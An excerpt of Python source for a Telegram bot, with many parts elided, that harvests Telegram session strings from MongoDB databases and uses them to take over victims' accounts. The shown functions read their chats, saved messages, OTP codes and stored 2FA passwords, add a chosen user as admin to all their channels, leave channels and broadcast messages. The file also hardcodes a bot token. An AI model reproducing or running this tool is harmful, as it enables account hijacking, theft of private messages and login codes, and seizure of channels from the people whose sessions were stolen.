...
BOT_TOKEN = "8744503418:AAGMzAnv5DrA42Nn6Y2sA5O6FRVWdD_HjJA"
...
def owner_only(func):
    ...
    async def wrapper(client, message):
        ...
        logger.info(f"User ID: {user_id}, Allowed: {ALLOWED_USERS}")
...
# ==================== FUNGSI MONGODB (OPTIMIZED) ====================
def get_all_sessions(uri, max_per_db=300):
    """Ambil session dari MongoDB dengan limit lebih rendah untuk Termux"""
    try:
        client = MongoClient(uri, serverSelectionTimeoutMS=20000, connectTimeoutMS=15000)
        sessions = []
        ...
        for db_name in client.list_database_names():
            ...
            for col_name in db.list_collection_names():
                ...
                try:
                    for doc in db[col_name].find({}).limit(80):
                        if count >= max_per_db:
                            break
                    ...
                    logger.error(f"Error collection {col_name}: {e}")
                    continue
...
async def check_session_active(session_string, delay=0.3):
    """Cek session aktif dengan delay lebih rendah"""
    try:
        await asyncio.sleep(delay)
        app = Client(
            "temp", API_ID, API_HASH, 
...
async def get_account_info(app):
    ...
    try:
        ...
        try:
            ...
            for auth in sessions.authorizations[:3]:
                devices.append({
...
async def get_all_dialogs(app):
    """Ambil dialog dengan limit lebih rendah"""
    try:
        chats = []
...
async def add_admin_to_channel(app, channel_id, target_username):
    ...
    try:
        ...
        if "USER_NOT_MUTUAL_CONTACT" in error_msg:
            ...
            return False, f"❌ Gagal: {error_msg[:100]}"
...
async def add_admin_to_all_channels(app, target_username):
    ...
    for ch in channels:
        ...
        if success:
            ...
            results.append(f"❌ {ch['title']}: {msg[:40]}")
...
async def leave_all_channels(app):
    ...
    for ch in channels:
        try:
            ...
            results.append(f"❌ {ch['title']}: {str(e)[:40]}")
        await asyncio.sleep(0.5)
...
async def get_messages(app, chat_id, limit=50):
    """Ambil pesan chat"""
    try:
        messages = []
...
async def broadcast_to_all(app, text, target_type="all"):
    ...
    for chat in chats:
        ...
        try:
            ...
            success_count += 1
            results.append(f"✅ {chat['name'][:25]}")
        except Exception as e:
            results.append(f"❌ {chat['name'][:25]}: {str(e)[:25]}")
...
async def main_handler(_, m):
    ...
    if text.startswith('mongodb'):
        ...
        for i, s in enumerate(all_sessions):
            ...
            success, _ = await check_session_active(s['session'], delay=0.3)
            if success:
...
async def callback_handler(c, q: CallbackQuery):
    ...
    if data == "saved_messages":
        ...
        messages = await get_saved_messages(ud['app'], 150)
    ...
    if data == "show_otp":
        ud = user_sessions.get(uid)
        if ud:
            otp = await get_last_otp(ud['app'], 8)
            if otp:
                text = "📡 **OTP TERBARU:**\n\n"
                for msg in otp[:5]:
                    if msg['otp']:
    ...
    if data.startswith("view_chat_"):
        ...
        if idx < len(chats):
            ...
            msgs = await get_messages(user_sessions[uid]['app'], chat['id'], 25)
            if msgs:
                text = f"💬 **{chat['name']}**\n"
    ...
    if data.startswith("view_msgs_"):
        ...
        if ud:
            ...
            msgs = await get_messages(ud['app'], chat_id, 25)
            if msgs:
                text = "💬 **PESAN:**\n\n"
                for msg in msgs[:15]:
                    icon = "📤" if msg['out'] else "📥"
...
if __name__ == "__main__":
    print("=" * 70)
    print("🤖 BOT CONTROL ULTIMATE - TERMUX EDITION")
    print("=" * 70)
    print("✅ FITUR LENGKAP:")
    print("   • 📝 PESAN TERSIMPAN (Navigasi)")
    print("   • 🔑 TAMPILKAN 2FA PASSWORD DARI DATABASE")
    print("   • 👑 DAFTAR ADMIN CHANNEL")
    print("   • 👑 ADD ADMIN KE SEMUA CHANNEL")
